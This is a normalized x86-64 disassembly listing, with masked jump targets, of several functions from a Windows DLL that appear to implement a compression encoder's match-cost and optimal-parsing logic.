sub_1800023a0
mov r11d edx
mov r10 rcx
test edx edx
jne r-xdata
mov ecx r8d
movzx eax [ r10 + rcx * 2 + 0x34018 ]
xor rax 0x7f0
shr rax 0x4
mov r8d [ r10 + rax * 4 + 0x3276c ]
cmp edx 0x1
jne r-xdata
mov r8d r8d
mov eax r9d
lea rdx [ r8 + 0x1a03 ]
shl rdx 0x4
add rdx rax
movzx eax [ rcx + rdx * 2 ]
movzx ecx [ rcx + r8 * 2 + 0x34018 ]
xor rax 0x7f0
shr rcx 0x4
shr rax 0x4
mov eax [ r10 + rax * 4 + 0x3276c ]
add eax [ r10 + rcx * 4 + 0x3276c ]
retn
movzx edx [ r10 + rcx * 2 + 0x34048 ]
movzx ecx [ r10 + rcx * 2 + 0x34030 ]
mov eax 0x2
sub eax r11d
shr rdx 0x4
xor rcx 0x7f0
sar rax 0x4
shr rcx 0x4
and eax 0x7f
xor rdx rax
mov eax [ r10 + rdx * 4 + 0x3276c ]
add eax [ r10 + rcx * 4 + 0x3276c ]
add eax r8d
retn
movzx ecx [ r10 + rcx * 2 + 0x34030 ]
shr rcx 0x4
add r8d [ r10 + rcx * 4 + 0x3276c ]
mov eax r8d
retn
sub_180002470
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov ebx r8d
mov rdi rdx
mov r10 rcx
lea r9 [ rbx + rbx * 2 ]
add r9 r9
xor esi esi
mov r11d [ rcx + r9 * 8 + 0x784 ]
mov r9d [ rcx + r9 * 8 + 0x788 ]
mov [ rcx + 0x758 ] ebx
nop [ rax + rax ] ax
mov ecx r11d
mov r8d r11d
mov edx r9d
lea rax [ rcx + rcx * 2 ]
add rax rax
mov r9d [ r10 + rax * 8 + 0x788 ]
mov r11d [ r10 + rax * 8 + 0x784 ]
lea rax [ rcx + rcx * 2 ]
add rax rax
mov [ r10 + rax * 8 + 0x784 ] ebx
mov [ r10 + rax * 8 + 0x788 ] edx
mov ebx r8d
test r8d r8d
jne r-xdata
mov eax r11d
lea rcx [ rax + rax * 2 ]
lea eax [ r11 - 0x1 ]
add rcx rcx
mov [ r10 + rcx * 8 + 0x788 ] 0xffffffff
mov [ r10 + rcx * 8 + 0x774 ] esi
mov [ r10 + rcx * 8 + 0x784 ] eax
cmp [ r10 + rdx * 8 + 0x778 ] esi
je r-xdata
mov r8d ebx
lea rdx [ r8 + r8 * 2 ]
add rdx rdx
cmp [ r10 + rdx * 8 + 0x774 ] esi
je r-xdata
mov eax [ r10 + 0x788 ]
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov [ rdi ] eax
mov eax [ r10 + 0x784 ]
mov rdi [ rsp + 0x18 ]
mov [ r10 + 0x75c ] eax
retn
lea rcx [ rax + rax * 2 ]
add rcx rcx
mov [ r10 + rcx * 8 + 0x774 ] esi
mov eax [ r10 + rdx * 8 + 0x77c ]
mov [ r10 + rcx * 8 + 0x784 ] eax
lea rax [ r8 + r8 * 2 + 0x78 ]
add rax rax
mov eax [ r10 + rax * 8 ]
mov [ r10 + rcx * 8 + 0x788 ] eax
sub_1800025a0
push rbp
push rbx
lea rbp [ rsp - 0x8 ]
sub rsp 0x108
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x28 ] rax
mov rbx rcx
mov ecx [ rcx + 0x75c ]
mov [ rsp + 0x68 ] r8
mov [ rsp + 0x38 ] edx
cmp [ rbx + 0x758 ] ecx
je r-xdata
xor eax eax
mov [ rsp + 0x100 ] rdi
mov [ rsp + 0xe0 ] r15
mov [ rbx + 0x758 ] rax
cmp [ rbx + 0x33204 ] eax
jne r-xdata
lea rdx [ rcx + rcx * 2 ]
add rdx rdx
mov eax [ rbx + rdx * 8 + 0x784 ]
sub eax ecx
mov ecx [ rbx + rdx * 8 + 0x788 ]
mov [ r8 ] ecx
mov ecx [ rbx + rdx * 8 + 0x784 ]
mov [ rbx + 0x75c ] ecx
jmp r-xdata
mov r15d [ rbx + 0x760 ]
mov eax [ rbx + 0x764 ]
lea rdx [ rsp + 0x44 ]
mov rcx rbx
call sub_1800022d0
mov r8 [ rsp + 0x68 ]
mov r15d eax
mov eax [ rsp + 0x44 ]
jmp r-xdata
mov rcx [ rbp - 0x28 ]
xor rcx rsp
call sub_18000c060
add rsp 0x108
pop rbx
pop rbp
retn
mov rcx [ rbx + 0x30 ]
mov eax 0x111
mov [ rsp + 0x138 ] rsi
cmp edi eax
mov [ rsp + 0xf8 ] r12
mov [ rsp + 0xf0 ] r13
cmova edi eax
mov [ rsp + 0xe8 ] r14
call [ rbx + 0x18 ]
movzx r12d [ rax - 0x1 ]
lea r11 [ rax - 0x1 ]
lea rax [ rbp - 0x48 ]
mov r14 rbx
xor r13d r13d
xor r10d r10d
xor r9d r9d
xor esi esi
sub r14 rax
mov [ r8 ] 0xffffffff
mov eax 0x1
jmp r-xdata
mov edi [ rbx + 0x768 ]
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x2c ] r15d
cmp edi 0x2
jae r-xdata
mov [ rbp + r9 - 0x38 ] 0x0
movzx eax [ r8 + 0x1 ]
cmp [ r11 + 0x1 ] al
jne r-xdata
mov rdi [ rsp + 0x100 ]
mov r15 [ rsp + 0xe0 ]
lea rax [ rbp + r9 - 0x48 ]
mov r8 r11
mov ecx [ r14 + rax + 0x33208 ]
mov [ rax ] ecx
inc ecx
sub r8 rcx
cmp r12b [ r8 ]
jne r-xdata
mov ecx [ rbx + 0x33200 ]
mov eax r13d
mov edi [ rbp + rax * 4 - 0x38 ]
cmp edi ecx
jb r-xdata
mov edx 0x2
cmp edi edx
jbe r-xdata
cmp r15d ecx
jb r-xdata
mov rdx [ rsp + 0x68 ]
mov [ rdx ] r13d
lea edx [ rdi - 0x1 ]
test edx edx
je r-xdata
mov [ rbp + r9 - 0x38 ] edx
cmp edx [ rbp + rsi - 0x38 ]
jbe r-xdata
lea rcx [ r11 + 0x2 ]
sub r8 r11
mov ecx [ rbp - 0x48 ]
mov rax r11
mov r13d edi
inc ecx
sub rax rcx
movzx esi [ rax ]
cmp r15d 0x2
jae r-xdata
mov eax [ rsp + 0x28 ]
mov rdx [ rsp + 0x68 ]
dec eax
mov eax [ rbx + rax * 4 + 0x3296c ]
add eax 0x4
mov [ rdx ] eax
lea edx [ r15 - 0x1 ]
test edx edx
je r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rbx + 0x30 ]
add [ rbx + 0x33204 ] edx
call [ rbx + 0x28 ]
inc r10d
add r9 0x4
cmp r10d 0x4
jb r-xdata
mov r13d r10d
mov rsi r9
jmp r-xdata
inc edx
inc rcx
cmp edx edi
jb r-xdata
mov edi [ rbx + 0x33218 ]
mov r9d [ rsp + 0x38 ]
mov edx [ rbx + 0x33e64 ]
mov ecx 0x8
mov eax r9d
mov [ rbx + 0x770 ] edi
and eax [ rbx + 0x33e70 ]
movzx r8d [ r11 - 0x1 ]
sub cl dl
shr r8d cl
mov ecx edx
mov r14d r9d
and r14d [ rbx + 0x33e74 ]
shl eax cl
add r8d eax
mov rax [ rbx + 0x33e78 ]
lea ecx [ r8 + r8 * 2 ]
shl ecx 0x8
lea r10 [ rax + rcx * 2 ]
cmp edi 0x7
jb r-xdata
cmp r12b sil
je r-xdata
mov eax r15d
jmp r-xdata
mov rcx [ rbx + 0x30 ]
add [ rbx + 0x33204 ] edx
call [ rbx + 0x28 ]
mov r14 [ rsp + 0xe8 ]
mov r13 [ rsp + 0xf0 ]
mov r12 [ rsp + 0xf8 ]
mov rsi [ rsp + 0x138 ]
movzx eax [ r8 + rcx ]
cmp [ rcx ] al
jne r-xdata
movzx r8d r12b
xor r11d r11d
bts r8d 0x8
nop [ rax + rax ] ax
lea r9 [ rbx + 0x3276c ]
movzx r8d sil
movzx edx r12b
mov rcx r10
call sub_180001c20
mov r11d eax
jmp r-xdata
cmp edi 0x2
jae r-xdata
mov ecx r8d
mov eax r8d
add r8d r8d
shr ecx 0x7
shr rax 0x8
movzx edx [ r10 + rax * 2 ]
and ecx 0x1
neg ecx
shr rdx 0x4
sar rcx 0x4
and ecx 0x7f
xor rdx rcx
add r11d [ rbx + rdx * 4 + 0x3276c ]
cmp r8d 0x10000
jb r-xdata
lea rcx [ rdi + 0x19f4 ]
mov r8d r14d
shl rcx 0x4
add rcx r8
movzx eax [ rbx + rcx * 2 ]
shr rax 0x4
mov eax [ rbx + rax * 4 + 0x3276c ]
mov [ rbx + 0x7b8 ] 0xffffffff
lea r9d [ r11 + rax ]
xor r11d r11d
mov [ rbx + 0x79c ] r9d
mov [ rbx + 0x7a4 ] r11d
movzx eax [ rbx + rcx * 2 ]
xor rax 0x7f0
shr rax 0x4
mov ecx [ rbx + rax * 4 + 0x3276c ]
movzx eax [ rbx + rdi * 2 + 0x34000 ]
xor rax 0x7f0
mov [ rsp + 0x4c ] ecx
shr rax 0x4
mov eax [ rbx + rax * 4 + 0x3276c ]
lea r10d [ rcx + rax ]
mov [ rsp + 0x44 ] r10d
cmp sil r12b
jne r-xdata
mov rdx [ rsp + 0x68 ]
mov eax 0x1
mov [ rdx ] 0xffffffff
jmp r-xdata
cmp r15d r13d
cmovae r13d r15d
mov [ rsp + 0x20 ] r13d
cmp r13d 0x2
jae r-xdata
lea rax [ rdi + 0x1a03 ]
shl rax 0x4
add rax r8
movzx ecx [ rbx + rax * 2 ]
movzx eax [ rbx + rdi * 2 + 0x34018 ]
shr rcx 0x4
shr rax 0x4
mov edx [ rbx + rcx * 4 + 0x3276c ]
add edx [ rbx + rax * 4 + 0x3276c ]
add edx r10d
cmp edx r9d
jae r-xdata
mov eax [ rbp - 0x48 ]
xor r15d r15d
mov edx r13d
mov [ rbx + 0x7b4 ] r15d
mov [ rbx + 0x78c ] eax
mov eax [ rbp - 0x44 ]
mov [ rbx + 0x790 ] eax
mov eax [ rbp - 0x40 ]
mov [ rbx + 0x794 ] eax
mov eax [ rbp - 0x3c ]
mov [ rbx + 0x798 ] eax
movsxd rax r13d
lea rcx [ rax + rax * 2 ]
add rcx rcx
lea rax [ rbx + rcx * 8 + 0x76c ]
mov eax [ rbx + 0x7b8 ]
mov rdx [ rsp + 0x68 ]
mov [ rdx ] eax
mov eax 0x1
jmp r-xdata
mov [ rbx + 0x79c ] edx
mov [ rbx + 0x7b8 ] r11d
mov [ rbx + 0x7a4 ] r11d
dec edx
mov [ rax ] 0x40000000
sub rax 0x30
cmp edx 0x2
jae r-xdata
mov esi r15d
movsxd r13 r14d
lea r12 [ rbp - 0x38 ]
nop [ rax + rax ] eax
inc esi
add r12 0x4
cmp esi 0x4
jb r-xdata
mov r8d [ rbx + 0x33218 ]
mov r9d r14d
mov edx esi
mov rcx rbx
call sub_1800023a0
mov r10d [ rsp + 0x44 ]
mov rcx r13
imul rcx rcx 0x110
add rcx rdi
lea r9d [ r10 + rax ]
lea r8 [ rbx + rcx * 4 + 0x39128 ]
lea rcx [ rdi + rdi * 2 ]
add rcx rcx
lea rdx [ rbx + rcx * 8 + 0x788 ]
nop [ rax + rax ] ax
movsxd rdi [ r12 ]
cmp edi 0x2
jb r-xdata
mov r11d [ rbp - 0x38 ]
mov eax [ rbx + 0x33218 ]
mov r15d [ rsp + 0x4c ]
movzx ecx [ rbx + rax * 2 + 0x34000 ]
shr rcx 0x4
add r15d [ rbx + rcx * 4 + 0x3276c ]
cmp r11d 0x2
inc r11d
jae r-xdata
dec edi
sub r8 0x4
sub rdx 0x30
cmp edi 0x2
jae r-xdata
mov [ rdx - 0x1c ] ecx
mov [ rdx - 0x4 ] r15d
mov [ rdx ] esi
mov [ rdx - 0x14 ] r15d
cmp r11d [ rsp + 0x2c ]
ja r-xdata
mov r11d 0x2
mov eax [ r8 ]
lea ecx [ r9 + rax ]
cmp ecx [ rdx - 0x1c ]
jae r-xdata
mov r11d 0x1
mov [ rsp + 0x24 ] r11d
mov r12d r11d
mov [ rbp - 0x68 ] r11
cmp [ rsp + 0x20 ] r11d
je r-xdata
xor esi esi
cmp r11d [ rbx + 0x3296c ]
jbe r-xdata
mov r8d r11d
lea r14 [ __dos_header ]
nop [ rax ] eax
movsxd rcx r11d
imul r13 r13 0x110
movsxd rax esi
lea r12 [ rbx + rax * 4 + 0x3296c ]
lea rax [ rcx + rcx * 2 ]
lea r14 [ rcx - 0x2 ]
add r13 rcx
add rax rax
lea r9 [ rbx + rax * 8 + 0x788 ]
lea r13 [ rbx + r13 * 4 + 0x348e0 ]
nop
lea rax [ rbx + 0x3296c ]
nop [ rax + rax ] ax
inc [ rbx + 0x33204 ]
cmp edi [ rbx + 0x33200 ]
jae r-xdata
lea ecx [ rax - 0x2 ]
movsxd rdi [ rbx + rcx * 4 + 0x3296c ]
mov [ rsp + 0x2c ] edi
cmp edi [ rbx + 0x33200 ]
jne r-xdata
shl r8 0x6
mov ecx 0x7ffff
mov rdx rdi
sub ecx edi
and edx 0xf
mov rax rdi
shr ecx 0x1f
neg ecx
and ecx 0xc
add ecx 0x6
shr rax cl
movzx eax [ rax + rbx + 0x3076c ]
lea eax [ rax + rcx * 2 ]
add rax r8
mov eax [ rbx + rax * 4 + 0x3321c ]
add eax [ rbx + rdx * 4 + 0x33e1c ]
add r10d eax
shl r8 0x7
add r8 rdi
add r10d [ rbx + r8 * 4 + 0x3361c ]
jmp r-xdata
add rax 0x8
add esi 0x2
cmp r11d [ rax ]
ja r-xdata
mov r8d [ rsp + 0x24 ]
mov [ rbx + 0x764 ] esi
mov [ rbx + 0x760 ] edi
jmp r-xdata
inc [ rsp + 0x38 ]
lea rdi [ r12 + r12 * 2 ]
add rdi rdi
mov r8d [ rbx + rdi * 8 + 0x774 ]
mov edx [ rbx + rdi * 8 + 0x784 ]
test r8d r8d
je r-xdata
mov rcx [ rbx + 0x30 ]
call [ rbx + 0x18 ]
mov r8d [ rbx + 0x768 ]
lea ecx [ rsi - 0x1 ]
mov ecx [ rbx + rcx * 4 + 0x3296c ]
mov edx 0x111
dec rax
cmp r8d edx
cmova r8d edx
inc ecx
mov rdx rax
sub rdx rcx
mov rcx rdi
cmp edi r8d
jae r-xdata
cmp r11d [ r12 ]
jne r-xdata
xor ecx ecx
lea eax [ rdi + 0x4 ]
mov [ r9 - 0x1c ] r10d
mov [ r9 ] eax
mov [ r9 - 0x4 ] ecx
mov [ r9 - 0x14 ] ecx
cmp r10d [ r9 - 0x1c ]
jae r-xdata
mov rdx [ rsp + 0x68 ]
mov rcx rbx
call sub_180002470
lea rcx [ rdx + rdx * 2 ]
add rcx rcx
mov ecx [ rbx + rcx * 8 + 0x770 ]
dec edx
cmp [ rbx + rdi * 8 + 0x778 ] 0x0
je r-xdata
add rcx rax
sub rdx rax
nop
inc r11d
add r13 0x4
inc r14
add r9 0x30
jmp r-xdata
add esi 0x2
add r12 0x8
cmp esi [ rsp + 0x28 ]
je r-xdata
test r8d r8d
je r-xdata
cmp [ rbx + rdi * 8 + 0x788 ] 0x0
mov eax ecx
jne r-xdata
lea rcx [ rdx + rdx * 2 ]
add rcx rcx
mov ecx [ rbx + rcx * 8 + 0x770 ]
mov eax ecx
mov ecx [ r14 + rax * 4 + 0x240e8 ]
jmp r-xdata
mov eax [ rbx + rdi * 8 + 0x77c ]
lea rcx [ rax + rax * 2 ]
add rcx rcx
cmp [ rbx + rdi * 8 + 0x780 ] 0x4
mov eax [ rbx + rcx * 8 + 0x770 ]
jae r-xdata
mov [ rsp + 0x2c ] edi
inc edi
inc rcx
cmp edi r8d
jb r-xdata
mov edi [ r12 + 0x4 ]
mov eax [ r13 ]
cmp r11d 0x5
mov r8d 0x3
lea r10d [ r15 + rax ]
cmovb r8 r14
cmp edi 0x80
jae r-xdata
mov r8d [ rbx + rdi * 8 + 0x788 ]
mov eax ecx
cmp r8d 0x4
jae r-xdata
cmp [ rbx + rdi * 8 + 0x778 ] 0x0
je r-xdata
mov r14d [ r14 + rax * 4 + 0x240e8 ]
mov [ rsp + 0x30 ] r14d
jmp r-xdata
mov r14d [ r14 + rax * 4 + 0x24178 ]
mov [ rsp + 0x30 ] r14d
jmp r-xdata
mov r13d [ rsp + 0x24 ]
lea eax [ r13 - 0x1 ]
cmp edx eax
jne r-xdata
mov ecx [ r14 + rax * 4 + 0x24118 ]
mov eax ecx
mov ecx [ r14 + rax * 4 + 0x240e8 ]
jmp r-xdata
mov ecx [ r14 + rax * 4 + 0x24148 ]
mov eax ecx
mov ecx [ r14 + rax * 4 + 0x240e8 ]
jmp r-xdata
movzx eax [ rdx + rcx ]
cmp [ rcx ] al
jne r-xdata
mov r14d [ r14 + rax * 4 + 0x24118 ]
mov r14d [ r14 + rax * 4 + 0x24148 ]
jmp r-xdata
mov edx [ rbx + rdi * 8 + 0x77c ]
mov r8d [ rbx + rdi * 8 + 0x780 ]
mov eax ecx
mov r14d [ r14 + rax * 4 + 0x24148 ]
jmp r-xdata
mov eax [ rbp - 0x44 ]
mov esi [ rbx + rdi * 8 + 0x76c ]
mov r12d [ rbp - 0x48 ]
mov [ rbx + rdi * 8 + 0x790 ] eax
mov eax [ rbp - 0x40 ]
mov [ rbx + rdi * 8 + 0x770 ] r14d
mov [ rbx + rdi * 8 + 0x794 ] eax
mov eax [ rbp - 0x3c ]
mov [ rbx + rdi * 8 + 0x78c ] r12d
mov [ rbx + rdi * 8 + 0x798 ] eax
mov rcx [ rbx + 0x30 ]
mov [ rsp + 0x3c ] esi
xor r15d r15d
call [ rbx + 0x18 ]
movzx r13d [ rax - 0x1 ]
mov r9d [ rsp + 0x38 ]
lea r8 [ rax - 0x1 ]
mov ecx r14d
lea r14 [ rcx + 0x19f4 ]
mov [ rsp + 0x78 ] rcx
mov eax r9d
and eax [ rbx + 0x33e74 ]
mov [ rsp + 0x58 ] r8
lea edx [ r12 + 0x1 ]
mov [ rsp + 0x28 ] eax
mov r12 r8
movzx r8d [ r8 - 0x1 ]
sub r12 rdx
mov edx [ rbx + 0x33e64 ]
shl r14 0x4
movzx r10d [ r12 ]
add r14 rax
movzx eax [ rbx + r14 * 2 ]
mov [ rsp + 0x40 ] r10b
shr rax 0x4
mov eax [ rbx + rax * 4 + 0x3276c ]
lea ecx [ rsi + rax ]
mov eax r9d
and eax [ rbx + 0x33e70 ]
mov [ rsp + 0x4c ] ecx
mov ecx 0x8
sub cl dl
shr r8d cl
mov ecx edx
shl eax cl
add r8d eax
mov rax [ rbx + 0x33e78 ]
lea ecx [ r8 + r8 * 2 ]
movzx r8d r13b
shl ecx 0x8
cmp [ rsp + 0x30 ] 0x7
lea rsi [ rax + rcx * 2 ]
jb r-xdata
lea eax [ r8 - 0x4 ]
mov [ rbp - 0x48 ] eax
mov eax [ rsi + 0x20 ]
mov [ rbp - 0x44 ] eax
mov eax [ rsi + 0x24 ]
mov [ rbp - 0x40 ] eax
mov eax [ rsi + 0x28 ]
mov [ rbp - 0x3c ] eax
mov r12d r8d
mov eax [ rsi + r12 * 4 + 0x20 ]
mov [ rbp - 0x48 ] eax
mov eax 0x1
mov r9d eax
cmp r8d eax
jb r-xdata
mov eax edx
mov [ rsp + 0x30 ] r14d
lea rcx [ rax + rax * 2 ]
add rcx rcx
lea rsi [ rbx + rcx * 8 + 0x76c ]
cmp r8d 0x4
jae r-xdata
xor r9d r9d
bts r8d 0x8
movzx r9d r10b
mov r10d 0x100
xor r11d r11d
or r8d r10d
nop [ rax + rax ] ax
mov r8d 0x4
lea rcx [ rbp + rax * 4 - 0x48 ]
lea rdx [ rsi + rax * 4 + 0x20 ]
sub r8d r9d
shl r8 0x2
call sub_18000c440
jmp r-xdata
mov r8d r12d
lea rdx [ rsi + 0x20 ]
lea rcx [ rbp - 0x44 ]
shl r8 0x2
call sub_18000c440
lea r9d [ r12 + 0x1 ]
lea rax [ r12 + 0x1 ]
cmp r9d 0x4
jae r-xdata
mov ecx r8d
mov eax r8d
add r8d r8d
shr ecx 0x7
shr rax 0x8
movzx edx [ rsi + rax * 2 ]
and ecx 0x1
neg ecx
shr rdx 0x4
sar rcx 0x4
and ecx 0x7f
xor rdx rcx
add r9d [ rbx + rdx * 4 + 0x3276c ]
cmp r8d 0x10000
jb r-xdata
mov r11d r9d
mov ecx r8d
add r9d r9d
mov eax r10d
shr ecx 0x8
and eax r9d
add eax r10d
add ecx eax
movzx edx [ rsi + rcx * 2 ]
mov ecx r8d
add r8d r8d
shr ecx 0x7
shr rdx 0x4
mov eax r8d
and ecx 0x1
xor eax r9d
neg ecx
not eax
sar rcx 0x4
and r10d eax
and ecx 0x7f
xor rdx rcx
add r11d [ rbx + rdx * 4 + 0x3276c ]
cmp r8d 0x10000
jb r-xdata
movzx r10d [ rsp + 0x40 ]
jmp r-xdata
movzx eax [ rbx + r14 * 2 ]
mov ecx [ rsp + 0x3c ]
mov r9 [ rsp + 0x78 ]
xor rax 0x7f0
shr rax 0x4
mov eax [ rbx + rax * 4 + 0x3276c ]
add ecx eax
movzx eax [ rbx + r9 * 2 + 0x34000 ]
xor rax 0x7f0
mov [ rsp + 0x70 ] ecx
shr rax 0x4
mov eax [ rbx + rax * 4 + 0x3276c ]
lea r8d [ rcx + rax ]
mov [ rbp - 0x60 ] r8d
cmp r10b r13b
jne r-xdata
mov [ rbx + rdi * 8 + 0x7a4 ] r15d
mov [ rbx + rdi * 8 + 0x79c ] esi
mov [ rbx + rdi * 8 + 0x7b4 ] r11d
mov r15d 0x1
mov [ rbx + rdi * 8 + 0x7b8 ] 0xffffffff
mov esi [ rsp + 0x4c ]
add esi r11d
mov r11d [ rsp + 0x24 ]
cmp esi [ rbx + rdi * 8 + 0x79c ]
jae r-xdata
mov ecx [ rbx + 0x768 ]
mov eax 0xfff
sub eax r11d
cmp eax ecx
cmovb ecx eax
mov [ rsp + 0x4c ] ecx
cmp ecx 0x2
jb r-xdata
cmp [ rbx + rdi * 8 + 0x7b4 ] r11d
jae r-xdata
mov r12 [ rbp - 0x68 ]
inc r11d
lea r14 [ __dos_header ]
inc r12
mov [ rsp + 0x24 ] r11d
mov [ rbp - 0x68 ] r12
cmp r11d [ rsp + 0x20 ]
jne r-xdata
mov r9d [ rbx + 0x33200 ]
cmp ecx r9d
mov r14d r9d
cmovbe r14d ecx
mov [ rsp + 0x48 ] r14d
test r15d r15d
jne r-xdata
mov edx [ rsp + 0x28 ]
lea rax [ r9 + 0x1a03 ]
shl rax 0x4
add rax rdx
movzx ecx [ rbx + rax * 2 ]
movzx eax [ rbx + r9 * 2 + 0x34018 ]
shr rcx 0x4
shr rax 0x4
mov edx [ rbx + rcx * 4 + 0x3276c ]
add edx [ rbx + rax * 4 + 0x3276c ]
add edx r8d
cmp edx [ rbx + rdi * 8 + 0x79c ]
ja r-xdata
cmp [ rbx + rdi * 8 + 0x7b8 ] 0x0
je r-xdata
mov rcx [ rbx + 0x30 ]
xor edi edi
mov [ rsp + 0x2c ] edi
call [ rbx + 0x10 ]
mov rcx [ rbx + 0x30 ]
lea rdx [ rbx + 0x3296c ]
mov [ rbx + 0x768 ] eax
call [ rbx + 0x20 ]
mov esi eax
mov [ rsp + 0x44 ] eax
test eax eax
je r-xdata
mov r12d [ rsp + 0x20 ]
cmp r10b r13b
je r-xdata
xor eax eax
mov [ rbx + rdi * 8 + 0x79c ] edx
mov [ rbx + rdi * 8 + 0x7b4 ] r11d
lea r15d [ rax + 0x1 ]
mov [ rbx + rdi * 8 + 0x7b8 ] eax
mov [ rbx + rdi * 8 + 0x7a4 ] eax
mov rax [ rbp - 0x78 ]
inc r13d
add rax 0x4
mov [ rsp + 0x3c ] r13d
mov [ rbp - 0x78 ] rax
cmp r13d 0x4
jb r-xdata
movzx eax [ rsi + 0x1 ]
cmp [ rdi + 0x1 ] al
jne r-xdata
inc r9d
mov edx 0x1
cmp r9d ecx
mov r8d edx
cmova r9d ecx
cmp r9d edx
jbe r-xdata
mov ecx [ rax ]
mov rsi rdi
inc ecx
sub rsi rcx
movzx eax [ rsi ]
cmp [ rdi ] al
jne r-xdata
mov ecx [ rsp + 0x2c ]
lea r8 [ rbx + 0x3296c ]
cmp ecx r14d
jbe r-xdata
mov edi 0x2
mov r15d edi
cmp r14d edi
jbe r-xdata
dec edx
lea r11 [ r8 - 0x1 ]
cmp edx 0x2
jb r-xdata
mov rax [ rsp + 0x58 ]
sub r12 rax
lea rcx [ rax + 0x1 ]
movsxd rdi [ rsp + 0x34 ]
cmp ecx edi
jb r-xdata
xor edx edx
xor eax eax
mov ecx r14d
cmp r14d [ r8 ]
jbe r-xdata
lea edx [ rdi + r11 ]
cmp r12d edx
jae r-xdata
mov rax [ rsp + 0x58 ]
mov rdx rsi
lea rcx [ rax + 0x2 ]
sub rdx rax
nop
mov r11d [ rsp + 0x24 ]
mov eax [ rsp + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r13d [ rsp + 0x24 ]
movsxd r12 [ rsp + 0x20 ]
inc eax
lea r8 [ __dos_header ]
and eax [ rbx + 0x33e74 ]
mov r10d [ r8 + rcx * 4 + 0x240e8 ]
lea edx [ rdx + r13 + 0x1 ]
mov r8d eax
lea rax [ r10 + 0x19f4 ]
shl rax 0x4
add rax r8
movzx ecx [ rbx + rax * 2 ]
movzx eax [ rbx + r10 * 2 + 0x34000 ]
xor rax 0x7f0
xor rcx 0x7f0
shr rax 0x4
shr rcx 0x4
mov r9d [ rbx + rcx * 4 + 0x3276c ]
add r9d [ rbx + rax * 4 + 0x3276c ]
mov rax [ rbp - 0x68 ]
add r9d esi
lea rdi [ rax + r11 + 0x1 ]
cmp r12d edx
jae r-xdata
inc edx
inc r8
inc rcx
cmp edx r9d
jb r-xdata
mov rax [ rsp + 0x78 ]
mov r10d [ rsp + 0x70 ]
lea edx [ rcx + r11 ]
movzx eax [ rbx + rax * 2 + 0x34000 ]
shr rax 0x4
mov eax [ rbx + rax * 4 + 0x3276c ]
add r10d eax
movsxd rax r12d
mov [ rsp + 0x28 ] r10d
cmp r12d edx
jae r-xdata
add edx 0x2
mov [ r8 + rax * 4 ] r14d
mov [ rsp + 0x44 ] edx
nop
mov r8d r10d
mov edx r13d
mov rcx rbx
mov r12d edi
mov [ rsp + 0x64 ] edi
call sub_1800023a0
mov r14d [ rsp + 0x24 ]
mov r9d eax
mov rax [ rbp - 0x58 ]
add r9d [ rbp - 0x60 ]
imul rax rax 0x110
lea rcx [ r15 + rax ]
mov [ rbp - 0x70 ] r9d
mov [ rbp - 0x38 ] rax
lea r8 [ rbx + rcx * 4 + 0x39128 ]
mov rcx [ rbp - 0x68 ]
add rcx r15
lea rdx [ rcx + rcx * 2 ]
add rdx rdx
lea rcx [ rbx + rdx * 8 + 0x788 ]
nop [ rax + rax ] ax
sub edx r12d
lea rax [ r8 + r8 * 2 ]
add rax rax
add r12d edx
lea rcx [ rbx + rax * 8 + 0x76c ]
mov eax edx
mov [ rsp + 0x20 ] r12d
add r8 rax
mov [ rsp + 0x50 ] r8
nop [ rax + rax ] ax
inc edi
inc r15
inc rcx
cmp edi r14d
jb r-xdata
lea rax [ r10 + 0x1a03 ]
shl rax 0x4
add rax r8
imul r8 r8 0x110
movzx ecx [ rbx + rax * 2 ]
movzx eax [ rbx + r10 * 2 + 0x34018 ]
xor rcx 0x7f0
add r8 r11
shr rax 0x4
shr rcx 0x4
mov r11d r13d
mov edx [ rbx + rcx * 4 + 0x3276c ]
lea rcx [ rdi + rdi * 2 ]
add edx [ rbx + rax * 4 + 0x3276c ]
add rcx rcx
add edx [ rbx + r8 * 4 + 0x39128 ]
add edx r9d
cmp edx [ rbx + rcx * 8 + 0x76c ]
jae r-xdata
lea rax [ r12 + r12 * 2 ]
sub edx r12d
add rax rax
add r12d edx
lea rcx [ rbx + rax * 8 + 0x76c ]
mov eax edx
mov [ rsp + 0x20 ] r12d
nop [ rax + rax ] eax
movzx eax [ r12 + rcx ]
cmp [ rcx ] al
jne r-xdata
xor edx edx
xor eax eax
mov [ rsp + 0x2c ] edx
cmp edi [ r8 ]
jbe r-xdata
lea rax [ rax + rax * 2 ]
sub edx r12d
add rax rax
add r12d edx
lea rcx [ rbx + rax * 8 + 0x76c ]
mov eax edx
mov [ rsp + 0x20 ] r12d
nop [ rax + rax ] ax
add rax 0x2
add edx 0x2
cmp r14d [ r8 + rax * 4 ]
ja r-xdata
dec edi
sub r8 0x4
sub rcx 0x30
cmp edi 0x2
jae r-xdata
mov [ rcx - 0x1c ] edx
mov [ rcx - 0x4 ] r14d
mov [ rcx ] r13d
mov [ rcx - 0x14 ] 0x0
add rcx 0x30
dec rax
mov [ rcx ] 0x40000000
jne r-xdata
movzx eax [ rdx + rcx ]
cmp [ rcx ] al
jne r-xdata
movsxd r9 [ rsp + 0x28 ]
movsxd r10 [ rsp + 0x30 ]
mov rdi [ rsp + 0x58 ]
lea rax [ rbp - 0x48 ]
xor r13d r13d
movsxd r8 r12d
mov [ rbp - 0x58 ] r9
mov [ rbp - 0x50 ] r10
mov [ rsp + 0x34 ] 0x2
mov [ rsp + 0x3c ] r13d
mov [ rsp + 0x50 ] r8
mov [ rbp - 0x78 ] rax
nop [ rax + rax ] eax
lea eax [ r13 + 0x1 ]
mov [ rbx + rcx * 8 + 0x76c ] edx
mov [ rbx + rcx * 8 + 0x788 ] 0x0
mov [ rbx + rcx * 8 + 0x784 ] eax
mov [ rbx + rcx * 8 + 0x774 ] 0x1
jmp r-xdata
add rcx 0x30
dec rax
mov [ rcx ] 0x40000000
jne r-xdata
mov esi [ r8 + rax * 4 + 0x4 ]
mov r11 [ rbp - 0x58 ]
lea r8 [ r8 + rax * 4 ]
mov ecx 0x7ffff
imul r11 r11 0x110
mov eax esi
sub ecx esi
add r11 rdi
mov [ rsp + 0x50 ] r8
shr ecx 0x1f
mov [ rsp + 0x3c ] esi
mov r15 rdi
neg ecx
mov [ rsp + 0x78 ] rdi
